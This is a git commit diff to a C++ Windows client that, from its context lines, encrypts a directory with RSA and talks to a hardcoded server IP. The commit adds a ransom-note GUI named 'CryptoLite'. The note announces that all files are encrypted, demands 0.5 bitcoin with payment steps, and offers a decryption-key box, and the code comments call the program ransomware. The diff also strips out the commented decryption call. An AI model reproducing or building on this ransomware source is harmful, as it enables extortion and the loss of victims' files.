0edb2f56c3ff9ddac900f341c0066d6b363ebe38
arock <arock1998@naver.com>
2024-04-02 23:25:55 +0900

    feat: GUI 추가

--- client/client/client.cpp
+++ client/client/client.cpp
@@ -16,12 +16,16 @@
 
 using namespace std;
 
+LRESULT CALLBACK WinProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);
+
 #pragma comment(linker, "/entry:wWinMainCRTStartup /subsystem:console")
 #pragma comment(lib, "libssl.lib")
 #pragma comment(lib, "libcrypto.lib")
 
 const string SERVER_IP = "3.35.13.136";
 const int SERVER_PORT = 54000;
+#define IDC_MAIN_BUTTON	101			// Button identifier
+#define IDC_MAIN_EDIT	102			// Edit box identifier
 
 
 int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ int nCmdShow)
@@ -110,12 +114,173 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance
     EncryptDir(pubKey, filename);
     RSA_free(pubKey);
     
-    /*
-    RSA* priKey = getPriKey();
-    DecryptDir(priKey, filename);
-    RSA_free(priKey);
-    */
+    
+    
+
+
+    // win32 gui class
+    //
+    //
+    //
+    //Modified version of: http://www.win32developer.com/tutorial/windows/windows_tutorial_3.shtm
+
+    //Creates the Win32 gui class
+    WNDCLASSEX wClass;
+    ZeroMemory(&wClass, sizeof(WNDCLASSEX));
+    wClass.cbClsExtra = NULL;
+    wClass.cbSize = sizeof(WNDCLASSEX);
+    wClass.cbWndExtra = NULL;
+    wClass.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
+    wClass.hCursor = LoadCursor(NULL, IDC_ARROW);
+    wClass.hIcon = NULL;
+    wClass.hIconSm = NULL;
+    wClass.hInstance = hInstance;
+    wClass.lpfnWndProc = (WNDPROC)WinProc;
+    wClass.lpszClassName = L"Window Class";
+    wClass.lpszMenuName = NULL;
+    wClass.style = CS_HREDRAW | CS_VREDRAW;
+
+    //Registers the class
+    if (!RegisterClassEx(&wClass))
+    {
+        int nResult = GetLastError();
+        MessageBox(NULL,
+            L"Window class creation failed\r\n",
+            L"Window Class Failed",
+            MB_ICONERROR);
+    }
+
+    //Creates the window handle
+    HWND hWnd = CreateWindowEx(NULL, L"Window Class", L"CryptoLite",
+        WS_POPUP | WS_VISIBLE | WS_SYSMENU | WS_EX_TOOLWINDOW, 200, 200, 560, 340,
+        NULL, NULL, hInstance, NULL);
+
+    if (!hWnd)
+    {
+        int nResult = GetLastError();
+
+        MessageBox(NULL,
+            L"Window creation failed\r\n",
+            L"Window Creation Failed",
+            MB_ICONERROR);
+    }
+
+    //Displays the window handle
+    ShowWindow(hWnd, nCmdShow);
+
+    MSG msg;
+    ZeroMemory(&msg, sizeof(MSG));
+
+    //Waits for a response from the window, such as a button click
+    while (GetMessage(&msg, NULL, 0, 0))
+    {
+        TranslateMessage(&msg);
+        DispatchMessage(&msg);
+    }
+
     return 0;
+
+
+}
+
+
+/*
+Callback created to add text and objects to the screen
+Waits for user input and executes code depending on the action
+*/
+LRESULT CALLBACK WinProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)
+{
+    HWND hEdit;
+    switch (msg)
+    {
+        //Creates the text on screen by painting
+    case WM_PAINT:
+    {
+        //Vector of text to be displayed
+        std::vector<LPCWSTR> ransomText;
+        ransomText.push_back(L"ALL YOUR FILES HAVE BEEN ENCRYPTED!!!");
+        ransomText.push_back(L"There's no way to decrypt these files without the decryption key.");
+        ransomText.push_back(L"To retrieve the deceryption key a payment of 0.5 BC will need to be paid.");
+        ransomText.push_back(L"");
+        ransomText.push_back(L"INSTRUCTIONS:");
+        ransomText.push_back(L"");
+        ransomText.push_back(L"*Purchase the bitcoins from https://localbitcoins.com/.");
+        ransomText.push_back(L"*Transfer the bitcoins to a https://blockchain.info/ Wallet.");
+        ransomText.push_back(L"*From https://blockchain.info/ transfer the bitcoins to the below address.");
+        ransomText.push_back(L"*Add a message to the transaction with the following format:");
+        ransomText.push_back(L"{MAC-ADDRESS_EMAIL} <- ENSURE THIS IS CORRECT");
+        ransomText.push_back(L"Example:");
+        ransomText.push_back(L"00:A0:C9:14:C8:29_pwned@gmail.com");
+        ransomText.push_back(L"");
+        ransomText.push_back(L"Following payment the key will be emailed to you after confimation.");
+        ransomText.push_back(L"");
+        ransomText.push_back(L"IF YOU MESS UP YOUR MESSAGE FROMAT, YOU WILL NOT RECEIVE THE KEY!");
+
+        PAINTSTRUCT ps;
+        HDC hDC = BeginPaint(hWnd, &ps);
+        //Setting the text style
+        SetBkMode(hDC, TRANSPARENT);
+        SetTextColor(hDC, RGB(0, 255, 0));
+
+        //For every line of text in the it adds spacing
+        for (size_t i = 0; i < ransomText.size(); i++)
+        {
+            //Writes the text
+            TextOut(hDC, 10, 10 + (15 * i + 1), ransomText.at(i), wcslen(ransomText.at(i)));
+        }
+        //Text near the bitcoin edit box
+        LPCWSTR bcLabel = (L"BitCoin Address:");
+        TextOut(hDC, 10, 280, bcLabel, wcslen(bcLabel));
+        //Text near the decryption key edit box
+        LPCWSTR keyLabel = (L"Decryption Key:");
+        TextOut(hDC, 10, 310, keyLabel, wcslen(keyLabel));
+
+        EndPaint(hWnd, &ps);
+    }
+    break;
+
+
+    //Creates the objects in the GUI
+    case WM_CREATE:
+    {
+        // Creates a readonly edit box with my bitcoin addresss
+        hEdit = CreateWindowEx(WS_EX_CLIENTEDGE, L"EDIT", L"When you input 'end', files will be decrypted.",
+            WS_CHILD | WS_VISIBLE | ES_READONLY, 140, 280, 300, 20, hWnd, NULL, NULL, NULL);
+
+        // Create an edit box
+        hEdit = CreateWindowEx(WS_EX_CLIENTEDGE, L"EDIT", L"",
+            WS_CHILD | WS_VISIBLE | ES_AUTOHSCROLL, 140, 310, 300, 20, hWnd, NULL, NULL, NULL);
+
+        // Create a push button
+        HWND hWndButton = CreateWindowEx(NULL, L"BUTTON", L"DECRYPT",
+            WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON, 450, 310, 100, 22,
+            hWnd, (HMENU)IDC_MAIN_BUTTON, GetModuleHandle(NULL), NULL);
+
+    }
+    break;
+    //Waits for the commands to be sent back (Such as button presses)
+    case WM_COMMAND:
+        switch (LOWORD(wParam))
+        {
+            //Definded in header
+        case IDC_MAIN_BUTTON:
+        { 
+
+        }
+        break;
+        }
+        break;
+        //User closed the ransomware
+    case WM_DESTROY:
+    {
+        //exits the ransomware
+        PostQuitMessage(0);
+        return 0;
+    }
+    break;
+    }
+    //destroys the windows process
+    return DefWindowProc(hWnd, msg, wParam, lParam);
 }
 
 
